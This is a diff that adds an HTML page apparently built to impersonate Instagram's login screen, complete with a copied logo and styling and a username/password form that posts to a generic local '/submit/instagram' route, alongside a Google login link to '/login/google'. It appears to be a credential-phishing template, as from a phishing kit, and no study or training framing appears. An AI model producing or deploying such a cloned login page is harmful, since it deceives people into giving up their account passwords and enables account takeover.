@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * {
+            border: none;
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: #fafafa;
+            height: 100vh;
+            display: flex; /* Added for centering */
+            align-items: center; /* Added for centering */
+            justify-content: center; /* Added for centering */
+        }
+
+        main {
+            /* Removed height: 100vh; */
+            margin: auto;
+            max-width: 350px; /* Simplified max-width */
+            width: 100%; /* Ensure it takes width */
+        }
+
+        a { text-decoration: none; }
+        h1 { margin: 20px 0; }
+        ul { list-style: none; }
+
+        /**
+         * Flex rules
+         */
+
+        .flex {
+            display: -webkit-box;
+            display: -moz-box;
+            display: -webkit-flex;
+            display: -ms-flexbox;
+            display: flex;
+        }
+
+        .direction-column {
+            -webkit-box-direction: normal;
+            -webkit-box-orient: vertical;
+            -moz-box-direction: normal;
+            -moz-box-orient: vertical;
+            -webkit-flex-direction: column;
+            -ms-flex-direction: column;
+            flex-direction: column;
+        }
+
+        .justify-content-center {
+            -webkit-box-pack: center;
+            -moz-box-pack: center;
+            -ms-flex-pack: center;
+            -webkit-justify-content: center;
+            justify-content: center;
+        }
+
+        .align-items-center {
+            -webkit-box-align: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            -webkit-align-items: center;
+            align-items: center;
+        }
+
+        .flex-wrap {
+            -webkit-flex-wrap: wrap;
+            -ms-flex-wrap: wrap;
+            flex-wrap: wrap;
+        }
+
+        /**
+         *
+         */
+
+        .panel {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            margin-bottom: 10px;
+            padding: 10px;
+            width: 100%; /* Ensure panel takes full width */
+        }
+
+        #auth { max-width: 350px; }
+        /* Removed #mobile styles */
+
+        /**
+         * Login section
+         */
+        form {
+            width: 100%;
+            padding: 30px 40px; /* Adjusted padding */
+        }
+
+
+        .register {
+             padding: 20px; /* Adjusted padding */
+             text-align: center; /* Center text */
+        }
+
+
+        form .sr-only { display: none; }
+
+        form input {
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            color: #262626; /* Darker text */
+            margin-bottom: 8px;
+            padding: 10px 10px;
+            width: 100%;
+            font-size: 12px; /* Match typical input size */
+        }
+
+        form input::placeholder {
+            color: #8e8e8e; /* Standard placeholder color */
+        }
+
+        form input:focus {
+            border: 1px solid #a8a8a8; /* Slightly darker focus border */
+            outline: none;
+        }
+
+        form button {
+            background-color: #0095f6;
+            border-radius: 8px; /* Instagram uses rounder buttons */
+            color: #fff;
+            font-weight: bold;
+            padding: 8px 0; /* Adjusted padding */
+            margin-top: 15px; /* Increased margin */
+            width: 100%;
+            cursor: pointer; /* Add pointer cursor */
+            opacity: 0.7; /* Initial disabled look */
+            transition: opacity 0.2s ease-in-out; /* Smooth transition */
+        }
+
+        /* Add style for enabled button */
+         form button:not(:disabled) {
+             opacity: 1;
+         }
+
+
+        /**
+         * Separator login form from login with fb
+         */
+        .separator span {
+            background-color: #dbdbdb;
+            height: 1px;
+            width: calc(50% - 20px); /* Adjusted width */
+            flex-grow: 1; /* Allow spans to grow */
+        }
+
+        .separator .or {
+            color: #8e8e8e; /* Standard separator color */
+            font-weight: bold;
+            margin: 0 18px; /* Standard margin */
+            font-size: 13px; /* Standard font size */
+            text-transform: uppercase; /* Standard text transform */
+        }
+
+        .separator {
+            padding: 10px 40px 18px; /* Adjusted padding */
+            display: flex; /* Ensure flex properties apply */
+            align-items: center; /* Vertically center items */
+        }
+        /* Removed specific span margins */
+
+        /**
+         * Register section
+         */
+        .register * { font-size: 14px; }
+        .register a {
+            color: #0095f6;
+            font-weight: 600; /* Semibold */
+        }
+
+        .register p {
+             margin-right: 5px;
+             color: #262626; /* Standard text color */
+        }
+
+        /* Removed App download styles */
+        /* Removed Footer styles */
+
+        /* Added styles for logo */
+        .instagram-logo img {
+            height: 51px; /* Standard Instagram logo height */
+            width: auto;
+            margin-bottom: 12px; /* Margin below logo */
+        }
+
+        /**
+         * Media queries - Simplified as base styles are now mobile-first-ish
+         */
+
+        @media screen and (max-width: 450px) { /* Adjust breakpoint if needed */
+             body {
+                 background-color: white; /* Often white background on mobile */
+             }
+             .panel {
+                 border: none; /* Remove border on mobile */
+                 background-color: transparent; /* Transparent background */
+             }
+             main {
+                 padding: 0 10px; /* Add some padding */
+             }
+             form {
+                 padding: 20px; /* Reduce padding */
+             }
+             .separator {
+                 padding: 10px 20px 18px; /* Reduce padding */
+             }
+        }
+
+    </style>
+</head>
+<body>
+    <main> <!-- Removed flex classes, handled by body now -->
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column align-items-center"> <!-- Added align-items-center -->
+                <h1 title="Instagram" class="flex justify-content-center instagram-logo">
+                    <!-- Placeholder for SVG logo -->
+                    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBhcmlhLWxhYmVsPSJJbnN0YWdyYW0iIHJvbGU9ImltZyIgdmlld0JveD0iMCAwIDUxMiA1MTIiPjxyZWN0IHdpZHRoPSI1MTIiIGhlaWdodD0iNTEyIiByeD0iMTUlIiBpZD0iYiIvPjx1c2UgZmlsbD0idXJsKCNhKSIgeGxpbms6aHJlZj0iI2IiLz48dXNlIGZpbGw9InVybCgjYykiIHhsaW5rOmhyZWY9IiNiIi8+PHJhZGlhbEdyYWRpZW50IGlkPSJhIiBjeD0iLjQiIGN5PSIxIiByPSIxIj48c3RvcCBvZmZzZXQ9Ii4xIiBzdG9wLWNvbG9yPSIjZmQ1Ii8+PHN0b3Agb2Zmc2V0PSIuNSIgc3RvcC1jb2xvcj0iI2ZmNTQzZSIvPjxzdG9wIG9mZnNldD0iMSIgc3RvcC1jb2xvcj0iI2M4MzdhYiIvPjwvcmFkaWFsR3JhZGllbnQ+PGxpbmVhckdyYWRpZW50IGlkPSJjIiB4Mj0iLjIiIHkyPSIxIj48c3RvcCBvZmZzZXQ9Ii4xIiBzdG9wLWNvbG9yPSIjMzc3MWM4Ii8+PHN0b3Agb2Zmc2V0PSIuNSIgc3RvcC1jb2xvcj0iIzYwZiIgc3RvcC1vcGFjaXR5PSIwIi8+PC9saW5lYXJHcmFkaWVudD48ZyBmaWxsPSJub25lIiBzdHJva2U9IiNmZmZmZmYiIHN0cm9rZS13aWR0aD0iMzAiPjxyZWN0IHdpZHRoPSIzMDgiIGhlaWdodD0iMzA4IiB4PSIxMDIiIHk9IjEwMiIgcng9IjgxIi8+PGNpcmNsZSBjeD0iMjU2IiBjeT0iMjU2IiByPSI3MiIvPjxjaXJjbGUgY3g9IjM0NyIgY3k9IjE2NSIgcj0iNiIvPjwvZz48L3N2Zz4=" alt="Instagram logo" title="Instagram logo">
+                </h1>
+                <form action="/submit/instagram" method="post">
+                    <label for="username" class="sr-only">Telefone, nome de usuário ou e-mail</label>
+                    <input name="username" placeholder="Phone number, username, or email" autocapitalize="none" autocorrect="off" required />
+
+                    <label for="password" class="sr-only">Senha</label>
+                    <input name="password" type="password" placeholder="Password" required />
+
+                    <button type="submit" disabled>Log In</button> <!-- Initially disabled -->
+                </form>
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">OR</div>
+                    <span></span>
+                </div>
+                 <!-- Removed FB login and forgot password -->
+                 <div style="text-align: center; padding: 10px 0 20px 0;"> <!-- Placeholder for other login options if needed -->
+                     <a href="/login/google" style="color: #385185; font-weight: 600; font-size: 14px;">Log in with Google</a> <!-- Example -->
+                 </div>
+            </div>
+            <div class="panel register flex justify-content-center align-items-center"> <!-- Added align-items-center -->
+                <p>Don't have an account?</p>
+                <a href="#">Sign up</a>
+            </div>
+             <!-- Removed app download section -->
+        </section>
+    </main>
+    <!-- Removed footer -->
+    <script>
+        // Simple script to enable login button when both fields have input
+        const usernameInput = document.querySelector('input[name="username"]');
+        const passwordInput = document.querySelector('input[name="password"]');
+        const loginButton = document.querySelector('button[type="submit"]');
+
+        function checkInputs() {
+            if (usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
+                loginButton.disabled = false;
+            } else {
+                loginButton.disabled = true;
+            }
+        }
+
+        usernameInput.addEventListener('input', checkInputs);
+        passwordInput.addEventListener('input', checkInputs);
+    </script>
+</body>
+</html>
